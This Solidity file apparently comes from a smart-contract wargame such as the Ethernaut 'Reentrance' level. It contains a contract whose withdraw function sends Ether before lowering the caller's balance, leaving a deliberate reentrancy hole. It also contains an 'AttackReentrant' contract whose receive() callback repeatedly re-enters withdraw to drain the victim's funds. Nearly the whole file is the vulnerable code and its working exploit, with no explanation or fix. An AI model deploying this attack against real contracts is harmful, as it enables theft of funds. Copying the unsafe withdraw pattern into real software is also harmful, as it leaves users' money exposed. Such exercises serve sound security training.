// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract AttackReentrant {
    Reentrance public reentrance;

    constructor(address _reentranceAddress) {
        reentrance = Reentrance(payable(_reentranceAddress));
    }

    function withdraw() public {
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }

    receive() external payable {
        if (address(reentrance).balance > reentrance.balanceOf(address(this))) {
            reentrance.withdraw(reentrance.balanceOf(address(this)));
        } else if (address(reentrance).balance != 0) {
            reentrance.withdraw(address(reentrance).balance);
        }
    }
}
